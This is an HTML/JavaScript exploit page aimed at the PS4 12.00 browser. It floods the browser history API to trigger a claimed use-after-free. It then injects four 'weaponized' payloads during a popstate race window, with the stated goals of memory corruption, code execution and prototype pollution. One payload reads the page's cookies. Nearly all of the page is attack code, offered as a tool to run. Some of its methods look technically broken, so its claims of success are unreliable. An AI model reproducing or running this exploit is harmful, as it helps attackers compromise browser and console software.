<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Weaponized Race Injection</title>
</head>
<body>
<h2>PS4 12.00 - Weaponized Race Window Exploitation</h2>
<p><b>CRITICAL TEST:</b> Inject malicious payloads during race window</p>
<hr>

<button onclick="testPayload1()">Payload 1: ArrayBuffer Corruption</button>
<button onclick="testPayload2()">Payload 2: Function Injection</button>
<button onclick="testPayload3()">Payload 3: Prototype Pollution</button>
<button onclick="testPayload4()">Payload 4: Typed Array Confusion</button>
<button onclick="logEl.value = ''">Clear</button>

<br><br>
<textarea id="log" rows="35" cols="110"></textarea>

<script>
const logEl = document.getElementById("log");

function log(m){ 
  logEl.value += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

var exploitState = {
  raceTriggered: false,
  payloadInjected: false,
  injectedPayload: null,
  recoveredPayload: null
};

// ============================================================
// PAYLOAD 1: ArrayBuffer Corruption Attempt
// ============================================================
async function testPayload1() {
  logEl.value = "";
  log("================================================================");
  log("PAYLOAD 1: ARRAYBUFFER CORRUPTION");
  log("================================================================\n");
  
  log("[1.1] Creating victim ArrayBuffer");
  
  const victimBuffer = new ArrayBuffer(8192);
  const victimView = new Uint32Array(victimBuffer);
  
  // Fill with known pattern
  for(let i=0; i<2048; i++) {
    victimView[i] = 0xAAAA0000 + i;
  }
  
  log("  Victim buffer: 8192 bytes");
  log("  Pattern: 0xAAAA0000 + index");
  log("  First value: 0x" + victimView[0].toString(16));
  
  log("\n[1.2] Creating attacker buffer");
  
  const attackBuffer = new ArrayBuffer(8192);
  const attackView = new Uint32Array(attackBuffer);
  
  // Fill with attack pattern
  for(let i=0; i<2048; i++) {
    attackView[i] = 0xBBBB0000 + i;
  }
  
  log("  Attack buffer: 8192 bytes");
  log("  Pattern: 0xBBBB0000 + index");
  
  log("\n[1.3] Installing race handler");
  
  exploitState.raceTriggered = false;
  exploitState.payloadInjected = false;
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40 && !exploitState.raceTriggered) {
      exploitState.raceTriggered = true;
      
      log("\n>> RACE WINDOW TRIGGERED (index " + e.state.index + ")");
      
      try {
        // Inject payload: replace victim buffer with attack buffer
        const payload = {
          type: "arraybuffer_corruption",
          victim: victimBuffer,
          attack: attackBuffer,
          timestamp: Date.now()
        };
        
        // Critical: try to inject SAME buffer reference
        history.pushState(payload, "", "#injected_buffer");
        
        exploitState.payloadInjected = true;
        exploitState.injectedPayload = payload;
        
        log(">> Payload injected during race");
        
      } catch(err) {
        log(">> Injection failed: " + err.message);
      }
    }
  });
  
  log("  Handler installed");
  
  log("\n[1.4] Triggering UAF");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { index: i, data: [i, i*2] };
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  log("\n[1.5] Triggering race");
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(40);
  }
  
  await sleep(300);
  
  if(!exploitState.raceTriggered) {
    log(">> Race NOT triggered");
    return;
  }
  
  log(">> Race triggered successfully");
  
  log("\n[1.6] Recovering injected payload");
  
  // Navigate to injected state
  while(history.state && history.state.type !== "arraybuffer_corruption") {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.type === "arraybuffer_corruption") {
    log(">> Found injected payload");
    
    exploitState.recoveredPayload = history.state;
    
    log("  Type: " + history.state.type);
    log("  Victim buffer: " + history.state.victim.byteLength + " bytes");
    log("  Attack buffer: " + history.state.attack.byteLength + " bytes");
    
    // Critical test: check if buffers are same objects
    const recoveredVictim = new Uint32Array(history.state.victim);
    const recoveredAttack = new Uint32Array(history.state.attack);
    
    log("\n[1.7] Analyzing recovered buffers");
    
    log("  Recovered victim[0]: 0x" + recoveredVictim[0].toString(16));
    log("  Recovered victim[1]: 0x" + recoveredVictim[1].toString(16));
    log("  Recovered attack[0]: 0x" + recoveredAttack[0].toString(16));
    log("  Recovered attack[1]: 0x" + recoveredAttack[1].toString(16));
    
    // Check if original victim was corrupted
    log("\n  Original victim[0]: 0x" + victimView[0].toString(16));
    log("  Original victim[1]: 0x" + victimView[1].toString(16));
    
    // Identity tests
    log("\n  Identity tests:");
    log("    victim === recovered.victim: " + (victimBuffer === history.state.victim));
    log("    attack === recovered.attack: " + (attackBuffer === history.state.attack));
    
    // Try to modify recovered buffer
    log("\n[1.8] Attempting buffer modification");
    
    try {
      recoveredVictim[0] = 0xDEADBEEF;
      recoveredVictim[1] = 0xCAFEBABE;
      
      log("  Modified recovered buffer");
      log("  New values: [0x" + recoveredVictim[0].toString(16) + ", 0x" + recoveredVictim[1].toString(16) + "]");
      
      // Check if original was affected
      log("\n  Checking original buffer:");
      log("    Original victim[0]: 0x" + victimView[0].toString(16));
      
      if(victimView[0] === 0xDEADBEEF) {
        log("\n  >> CRITICAL: BUFFER CORRUPTION!");
        log("  >> Modification affected original!");
        log("  >> Same underlying memory!");
      } else {
        log("\n  >> Clone isolation maintained");
      }
      
    } catch(e) {
      log("  >> Modification failed: " + e.message);
    }
    
  } else {
    log(">> Injected payload NOT found");
  }
  
  log("\n================================================================");
  log("PAYLOAD 1 COMPLETE");
  log("================================================================\n");
}

// ============================================================
// PAYLOAD 2: Function Injection
// ============================================================
async function testPayload2() {
  logEl.value = "";
  log("================================================================");
  log("PAYLOAD 2: FUNCTION INJECTION");
  log("================================================================\n");
  
  log("[2.1] Creating malicious function");
  
  let executionCount = 0;
  
  const maliciousFunc = function() {
    executionCount++;
    log(">> MALICIOUS FUNCTION EXECUTED! (count: " + executionCount + ")");
    
    // Try to access document
    try {
      log("   document.domain: " + document.domain);
      log("   document.cookie: " + document.cookie);
    } catch(e) {
      log("   Access denied: " + e.message);
    }
    
    return "PWNED";
  };
  
  log("  Function created");
  
  log("\n[2.2] Installing race handler");
  
  exploitState.raceTriggered = false;
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40 && !exploitState.raceTriggered) {
      exploitState.raceTriggered = true;
      
      log("\n>> RACE WINDOW TRIGGERED");
      
      try {
        const payload = {
          type: "function_injection",
          func: maliciousFunc,
          trigger: function() { return this.func(); }
        };
        
        history.pushState(payload, "", "#injected_func");
        
        log(">> Function payload injected");
        
      } catch(err) {
        log(">> Injection failed: " + err.message);
      }
    }
  });
  
  log("  Handler installed");
  
  log("\n[2.3] Triggering UAF + Race");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { index: i, data: [i] };
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(40);
  }
  
  await sleep(300);
  
  log("\n[2.4] Recovering and executing function");
  
  while(history.state && history.state.type !== "function_injection") {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.type === "function_injection") {
    log(">> Found injected function");
    
    log("  Type: " + history.state.type);
    log("  func type: " + typeof history.state.func);
    log("  trigger type: " + typeof history.state.trigger);
    
    // Try to execute
    try {
      log("\n[2.5] Attempting execution");
      
      if(typeof history.state.func === 'function') {
        const result = history.state.func();
        log("  >> Direct call result: " + result);
      } else {
        log("  >> Function not preserved (serialization stripped it)");
      }
      
      if(typeof history.state.trigger === 'function') {
        const result = history.state.trigger();
        log("  >> Trigger call result: " + result);
      }
      
    } catch(e) {
      log("  >> Execution failed: " + e.message);
    }
    
    log("\n  Execution count: " + executionCount);
    
    if(executionCount > 0) {
      log("\n  >> CRITICAL: Function executed after recovery!");
      log("  >> Code injection successful!");
    }
    
  } else {
    log(">> Function payload NOT found");
  }
  
  log("\n================================================================");
  log("PAYLOAD 2 COMPLETE");
  log("================================================================\n");
}

// ============================================================
// PAYLOAD 3: Prototype Pollution
// ============================================================
async function testPayload3() {
  logEl.value = "";
  log("================================================================");
  log("PAYLOAD 3: PROTOTYPE POLLUTION");
  log("================================================================\n");
  
  log("[3.1] Setting up pollution payload");
  
  const pollutionPayload = {
    type: "prototype_pollution",
    __proto__: {
      polluted: true,
      maliciousGetter: "INJECTED"
    },
    nested: {
      __proto__: {
        deepPollution: "DEEP_INJECTED"
      }
    }
  };
  
  log("  Pollution payload created");
  
  log("\n[3.2] Testing BEFORE injection");
  
  const testObj1 = {};
  log("  testObj1.polluted: " + testObj1.polluted);
  log("  testObj1.maliciousGetter: " + testObj1.maliciousGetter);
  
  log("\n[3.3] Installing race handler");
  
  exploitState.raceTriggered = false;
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40 && !exploitState.raceTriggered) {
      exploitState.raceTriggered = true;
      
      log("\n>> RACE WINDOW TRIGGERED");
      
      try {
        history.pushState(pollutionPayload, "", "#injected_pollution");
        log(">> Pollution payload injected");
        
        // Force pollution NOW
        Object.prototype.raceMarker = "POLLUTED_DURING_RACE";
        
      } catch(err) {
        log(">> Injection failed: " + err.message);
      }
    }
  });
  
  log("  Handler installed");
  
  log("\n[3.4] Triggering UAF + Race");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { index: i, data: [i] };
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(40);
  }
  
  await sleep(300);
  
  log("\n[3.5] Testing AFTER injection");
  
  const testObj2 = {};
  log("  testObj2.raceMarker: " + testObj2.raceMarker);
  log("  testObj2.polluted: " + testObj2.polluted);
  
  if(testObj2.raceMarker === "POLLUTED_DURING_RACE") {
    log("\n  >> CRITICAL: Pollution persisted after race!");
    log("  >> Global prototype affected!");
  }
  
  log("\n[3.6] Recovering pollution payload");
  
  while(history.state && history.state.type !== "prototype_pollution") {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.type === "prototype_pollution") {
    log(">> Found pollution payload");
    
    const recovered = history.state;
    
    log("  recovered.polluted: " + recovered.polluted);
    log("  recovered.maliciousGetter: " + recovered.maliciousGetter);
    log("  recovered.nested.deepPollution: " + recovered.nested.deepPollution);
    
    // Check if pollution is active in recovered object
    const derivedObj = Object.create(recovered);
    
    log("\n  Testing derived object:");
    log("    derivedObj.polluted: " + derivedObj.polluted);
    log("    derivedObj.maliciousGetter: " + derivedObj.maliciousGetter);
    
  }
  
  // Cleanup
  delete Object.prototype.raceMarker;
  
  log("\n================================================================");
  log("PAYLOAD 3 COMPLETE");
  log("================================================================\n");
}

// ============================================================
// PAYLOAD 4: Typed Array Confusion
// ============================================================
async function testPayload4() {
  logEl.value = "";
  log("================================================================");
  log("PAYLOAD 4: TYPED ARRAY CONFUSION");
  log("================================================================\n");
  
  log("[4.1] Creating typed arrays with different views");
  
  const buffer = new ArrayBuffer(256);
  const uint8View = new Uint8Array(buffer);
  const uint32View = new Uint32Array(buffer);
  const float64View = new Float64Array(buffer);
  
  // Fill with pattern
  for(let i=0; i<64; i++) {
    uint32View[i] = 0x41424344 + i;
  }
  
  log("  Shared buffer: 256 bytes");
  log("  Views: Uint8, Uint32, Float64");
  log("  uint32View[0]: 0x" + uint32View[0].toString(16));
  log("  float64View[0]: " + float64View[0]);
  
  log("\n[4.2] Installing race handler");
  
  exploitState.raceTriggered = false;
  
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.index >= 40 && !exploitState.raceTriggered) {
      exploitState.raceTriggered = true;
      
      log("\n>> RACE WINDOW TRIGGERED");
      
      try {
        // Inject multiple views of same buffer
        const payload = {
          type: "typed_array_confusion",
          sharedBuffer: buffer,
          view8: uint8View,
          view32: uint32View,
          viewFloat: float64View
        };
        
        history.pushState(payload, "", "#injected_views");
        
        log(">> Multiple views injected");
        
      } catch(err) {
        log(">> Injection failed: " + err.message);
      }
    }
  });
  
  log("  Handler installed");
  
  log("\n[4.3] Triggering UAF + Race");
  
  let size = BASE;
  for(let i=0; i<UAF_ITERS; i++){
    let state = { index: i, data: [i] };
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  await sleep(200);
  
  for(let i=0; i<15; i++) {
    history.back();
    await sleep(40);
  }
  
  await sleep(300);
  
  log("\n[4.4] Recovering typed arrays");
  
  while(history.state && history.state.type !== "typed_array_confusion") {
    history.forward();
    await sleep(20);
  }
  
  if(history.state && history.state.type === "typed_array_confusion") {
    log(">> Found typed array payload");
    
    const recovered = history.state;
    
    log("\n[4.5] Analyzing recovered views");
    
    log("  view8 length: " + recovered.view8.length);
    log("  view32 length: " + recovered.view32.length);
    log("  viewFloat length: " + recovered.viewFloat.length);
    
    log("\n  view32[0]: 0x" + recovered.view32[0].toString(16));
    log("  viewFloat[0]: " + recovered.viewFloat[0]);
    
    // Check buffer identity
    log("\n  Buffer identity:");
    log("    view8.buffer === view32.buffer: " + (recovered.view8.buffer === recovered.view32.buffer));
    log("    view32.buffer === viewFloat.buffer: " + (recovered.view32.buffer === recovered.viewFloat.buffer));
    log("    sharedBuffer === view32.buffer: " + (recovered.sharedBuffer === recovered.view32.buffer));
    
    // Try type confusion
    log("\n[4.6] Attempting type confusion");
    
    try {
      // Modify via one view
      recovered.view32[0] = 0xDEADBEEF;
      
      log("  Modified view32[0] = 0xDEADBEEF");
      
      // Read via other views
      log("  view8[0-3]: [" + 
          "0x" + recovered.view8[0].toString(16) + ", " +
          "0x" + recovered.view8[1].toString(16) + ", " +
          "0x" + recovered.view8[2].toString(16) + ", " +
          "0x" + recovered.view8[3].toString(16) + "]");
      
      log("  viewFloat[0]: " + recovered.viewFloat[0]);
      
      // Check if original was affected
      log("\n  Original view32[0]: 0x" + uint32View[0].toString(16));
      
      if(uint32View[0] === 0xDEADBEEF) {
        log("\n  >> CRITICAL: Type confusion successful!");
        log("  >> Shared buffer maintained across recovery!");
      } else {
        log("\n  >> Clone isolation: buffers are independent");
      }
      
    } catch(e) {
      log("  >> Type confusion failed: " + e.message);
    }
    
  } else {
    log(">> Typed array payload NOT found");
  }
  
  log("\n================================================================");
  log("PAYLOAD 4 COMPLETE");
  log("================================================================\n");
}

// Initialize
log("PS4 12.00 - Weaponized Race Window Exploitation");
log("===============================================\n");
log("Four weaponized payloads to test during race window:");
log("");
log("PAYLOAD 1: ArrayBuffer Corruption");
log("  - Inject victim + attack buffers");
log("  - Test if modifications cross clone boundary");
log("  - Goal: Achieve arbitrary memory write");
log("");
log("PAYLOAD 2: Function Injection");
log("  - Inject malicious functions");
log("  - Test if functions survive serialization");
log("  - Goal: Achieve code execution");
log("");
log("PAYLOAD 3: Prototype Pollution");
log("  - Pollute Object.prototype during race");
log("  - Test if pollution persists");
log("  - Goal: Global state corruption");
log("");
log("PAYLOAD 4: Typed Array Confusion");
log("  - Inject multiple views of same buffer");
log("  - Test buffer identity across recovery");
log("  - Goal: Type confusion exploit");
log("");
log("Click buttons to test each payload.");
log("WARNING: May cause browser instability.\n");
</script>
</body>
</html>
